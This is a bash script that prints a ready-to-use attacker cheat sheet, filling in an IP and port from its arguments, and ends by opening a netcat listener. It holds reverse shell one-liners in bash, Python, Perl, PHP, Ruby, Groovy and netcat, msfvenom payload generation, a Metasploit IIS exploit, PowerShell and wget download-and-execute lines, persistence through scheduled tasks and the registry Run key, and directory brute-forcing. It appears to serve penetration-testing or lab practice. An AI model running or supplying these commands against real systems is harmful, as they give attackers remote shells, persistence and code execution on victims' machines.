#!/bin/bash 

printf "\n"
printf "cewl -d 2 -m 5 -w words.txt http://$1 2>/dev/null;john --wordlist=words.txt --rules:Tuned --stdout > mangled_words.txt"
printf "\n\n"

printf "dirb http://$1"
printf "\n\n"

printf "dirsearch.py -u http://$ip -e aspx -f -t 20"
printf "wfuzz -c -w /usr/share/dirb/wordlists/big.txt --hs 403 http://$ip/FUZZ"
printf "gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm"
printf "\n\n"


printf "\n\n"

printf "echo $wc=New-Object Net.WebClient>w.ps1 && echo $u=\"http://$1/$3\">>w.ps1 && echo $f=$3>>w.ps1 && echo $wc.DownloadFile($u,$f)>>w.ps1"
printf "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File w.ps1"
printf "\n\n"

printf "msfconsole -x \"use exploit/windows/iis/iis_webdav_upload_asp;set PAYLOAD $4;set LHOST $1;set LPORT $2\""
printf "\n\n"

printf "$wc = New-Object System.Net.WebClient;$wc.DownloadFile(http://$1:$2, \"C:\Users\Public\");Start-Process -Filepath \"C:\Users\Public\my.exe\""
printf "\n\n"

printf "apt update && apt install -y virtualbox-guest-x11"
printf "\n\n"

cat << EOF 
skipfish -YO -o ~/skipfish http://$1
EOF

printf "schtasks /create /sc minute /TN \"EMOM\" /TR \"C:\Users\Public\c.exe\""
printf "\n\n"

printf "reg add \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" /v EROR /t REG_SZ /d \"C:\Users\Public\c.exe\""
printf "\n\n"

printf "msfvenom -p java/jsp_shell_reverse_tcp LHOST=$1 LPORT=$2 -f raw > rev_shell.jsp"
printf "\n\n"

printf "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$1 LPORT=$2 -f elf > rev_shell.sh"
printf "\n\n"

printf "/usr/bin/wget http://$1:$2/rev_shell -O /dev/shm/rev_shell;chmod 777 /dev/shm/rev_shell;/dev/shm/rev_shell"
printf "\n\n"

printf "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
printf "\n\n"

printf "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
printf "\n\n"

printf "perl -e 'use Socket;\$i=\"$1\";\$p=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
printf "\n\n"

printf "bash -i >& /dev/tcp/$1/$2 0>&1"
printf '\n\n'

printf "php -r '$sock=fsockopen(\"$1\",$2);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
printf "\n\n"

printf "ruby -rsocket -e'f=TCPSocket.open(\"$1\",$2).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
printf "\n\n"

printf "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$1/$2;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor()"
printf "\n\n"

printf "nc -e /bin/sh $1 $2"
printf "\n\n"

printf "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f"
printf "\n\n"

nc -nlvp $2
